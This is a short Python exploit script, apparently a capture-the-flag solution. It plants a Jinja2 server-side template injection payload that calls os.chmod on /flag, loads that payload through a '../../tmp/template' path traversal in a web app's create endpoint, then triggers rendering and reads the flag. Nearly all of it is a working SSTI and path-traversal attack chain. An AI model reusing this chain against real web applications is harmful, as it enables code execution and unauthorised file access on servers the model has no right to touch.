#!/usr/bin/env python3

from pwn import *
import requests

write('/tmp/template', '{{lipsum.__globals__["os"].chmod("/flag", 4)}}')
toy_id = requests.post('http://0.0.0.0/create', json={'template': '../../tmp/template'}).json()['toy_id']
requests.post(f'http://0.0.0.0/tinker/{toy_id}', json={'op': 'render'})
success(f'Flag: {read('/flag').decode()}')
